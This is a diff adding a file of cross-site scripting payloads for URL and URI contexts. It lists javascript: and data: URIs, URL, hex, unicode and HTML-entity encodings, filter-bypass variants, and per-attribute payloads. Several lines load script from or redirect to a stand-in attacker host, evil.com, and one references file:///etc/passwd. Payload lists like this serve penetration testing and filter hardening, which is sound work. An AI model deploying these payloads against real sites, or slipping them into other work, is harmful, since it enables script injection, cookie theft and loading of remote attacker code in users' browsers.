@@ -1,0 +1,287 @@
+# URL/URI Context XSS Payloads
+# These payloads work when input is used in URL/URI contexts (href, src, action, etc.)
+
+# JavaScript protocol
+javascript:alert(1)
+javascript:confirm(1)
+javascript:prompt(1)
+javascript:alert(document.domain)
+javascript:alert(document.cookie)
+javascript:alert(window.origin)
+
+# With void to prevent navigation
+javascript:void(alert(1))
+javascript:void(confirm(1))
+javascript:void(prompt(1))
+
+# With URL encoding
+javascript:alert%281%29
+javascript:alert%28document.domain%29
+javascript:%61%6c%65%72%74%28%31%29
+
+# With double URL encoding
+javascript:alert%25281%2529
+javascript:%2561%256c%2565%2572%2574%2528%2531%2529
+
+# With hex encoding
+javascript:alert\x28\x31\x29
+javascript:\x61\x6c\x65\x72\x74(1)
+
+# With unicode encoding
+javascript:alert\u0028\u0031\u0029
+javascript:\u0061\u006c\u0065\u0072\u0074(1)
+
+# With HTML entities
+javascript:alert&#40;1&#41;
+javascript:alert&#x28;1&#x29;
+
+# Case variations
+JavaScript:alert(1)
+jAvAsCrIpT:alert(1)
+JAVASCRIPT:alert(1)
+
+# With whitespace
+javascript:  alert(1)
+javascript:
+alert(1)
+javascript:	alert(1)
+
+# With null bytes
+javascript:alert(1)%00
+javascript:%00alert(1)
+
+# With line breaks
+javascript:alert(1)%0A
+javascript:alert(1)%0D
+javascript:alert(1)%0D%0A
+
+# With tabs and newlines
+javascript:%09alert(1)
+javascript:%0aalert(1)
+javascript:%0dalert(1)
+
+# Data URI with HTML
+data:text/html,<script>alert(1)</script>
+data:text/html,<img src=x onerror=alert(1)>
+data:text/html,<svg onload=alert(1)>
+data:text/html,<body onload=alert(1)>
+
+# Data URI with base64
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==
+data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
+
+# Data URI with JavaScript
+data:text/javascript,alert(1)
+data:application/javascript,alert(1)
+data:text/javascript;base64,YWxlcnQoMSk=
+
+# VBScript (IE legacy)
+vbscript:msgbox(1)
+vbscript:MsgBox(document.cookie)
+
+# Blob URL
+blob:javascript:alert(1)
+
+# With fragments
+javascript:alert(1)#
+javascript:alert(1)#comment
+data:text/html,<script>alert(1)</script>#
+
+# With query strings
+javascript:alert(1)?
+javascript:alert(1)?x=y
+data:text/html,<script>alert(1)</script>?x=y
+
+# With auth credentials
+javascript://user:pass@host/alert(1)
+
+# File protocol
+file:///etc/passwd
+
+# About protocol
+about:blank#<script>alert(1)</script>
+
+# Jar protocol (Java)
+jar:javascript:alert(1)
+
+# Wyciwyg protocol (Firefox legacy)
+wyciwyg://0/javascript:alert(1)
+
+# View-source
+view-source:javascript:alert(1)
+view-source:data:text/html,<script>alert(1)</script>
+
+# Gopher protocol
+gopher://evil.com
+
+# FTP with credentials
+ftp://user:pass@evil.com
+
+# Mailto with XSS
+mailto:?subject=<script>alert(1)</script>
+mailto:?body=<script>alert(1)</script>
+
+# Tel protocol
+tel:+1234567890
+
+# SMS protocol
+sms:+1234567890?body=XSS
+
+# Geo protocol
+geo:37.786971,-122.399677
+
+# Market protocol (Android)
+market://details?id=<script>alert(1)</script>
+
+# Intent protocol (Android)
+intent://evil.com#Intent;scheme=http;end
+
+# Custom protocol handlers
+custom:alert(1)
+x-custom:alert(1)
+
+# JavaScript with comments
+javascript:/*comment*/alert(1)
+javascript://comment%0aalert(1)
+javascript:alert(1)//comment
+
+# JavaScript multiline
+javascript:alert(1);alert(2)
+javascript:alert(1);confirm(2);prompt(3)
+
+# With functions
+javascript:(function(){alert(1)})()
+javascript:void function(){alert(1)}()
+javascript:!function(){alert(1)}()
+
+# With eval
+javascript:eval('alert(1)')
+javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))
+
+# With setTimeout
+javascript:setTimeout('alert(1)',0)
+javascript:setTimeout(alert,0,1)
+
+# With setInterval
+javascript:setInterval('alert(1)',0)
+javascript:setInterval(alert,0,1)
+
+# Location manipulation
+javascript:location='http://evil.com'
+javascript:location.href='http://evil.com'
+
+# Document manipulation
+javascript:document.write('<img src=x onerror=alert(1)>')
+javascript:document.body.innerHTML='<img src=x onerror=alert(1)>'
+
+# With onerror
+javascript:onerror=alert;throw 1
+javascript:window.onerror=alert;throw 1
+
+# With import
+javascript:import('data:text/javascript,alert(1)')
+javascript:import('//evil.com/xss.js')
+
+# Data URI variants
+data:,<script>alert(1)</script>
+data:base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+data:;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+# Data URI with charset
+data:text/html;charset=utf-8,<script>alert(1)</script>
+data:text/html;charset=utf-8;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+# Data URI with different MIME types
+data:image/svg+xml,<svg onload=alert(1)>
+data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
+data:text/xml,<script>alert(1)</script>
+
+# With fragment identifier
+#javascript:alert(1)
+##javascript:alert(1)
+
+# Breaking URL parsers
+javascript:alert(1);
+javascript:alert(1)//
+javascript:alert(1)/**/
+
+# Protocol confusion
+http://javascript:alert(1)@evil.com
+https://javascript:alert(1)@evil.com
+
+# With @ symbol
+javascript:alert@1
+javascript:void@alert(1)
+
+# Path traversal attempts
+../javascript:alert(1)
+../../javascript:alert(1)
+
+# Absolute vs relative
+//evil.com/xss.js
+///evil.com/xss.js
+////evil.com/xss.js
+
+# With backslashes (Windows-style)
+javascript:alert(1)\
+javascript:alert(1)\\
+
+# With mixed slashes
+javascript:/alert(1)
+javascript://alert(1)
+javascript:///alert(1)
+
+# Embedded credentials
+javascript://user@host:alert(1)
+
+# With ports
+javascript://host:80/alert(1)
+
+# URL with encoded colon
+javascript%3Aalert(1)
+java%09script:alert(1)
+java%0ascript:alert(1)
+
+# Filter bypass attempts
+j&#97;vascript:alert(1)
+j&#x61;vascript:alert(1)
+&#106;avascript:alert(1)
+&#x6a;avascript:alert(1)
+
+# With various delimiters
+javascript&colon;alert(1)
+javascript:alert&#40;1&#41;
+javascript:alert&#x28;1&#x29;
+
+# Minimal payloads
+javascript:alert(1)
+javascript:alert`1`
+data:text/html,<script>alert(1)</script>
+data:,<script>alert(1)</script>
+
+# For href attributes
+javascript:void(alert(1))
+#" onclick="alert(1)
+javascript:void(0);alert(1)
+
+# For src attributes
+javascript:alert(1)
+data:text/javascript,alert(1)
+//evil.com/xss.js
+
+# For action attributes
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+
+# For formaction
+javascript:alert(1)
+data:,<script>alert(1)</script>
+
+# For poster attribute (video)
+javascript:alert(1)
+data:image/svg+xml,<svg onload=alert(1)>
+
+# For background attribute
+javascript:alert(1)
+data:text/html,<body onload=alert(1)>
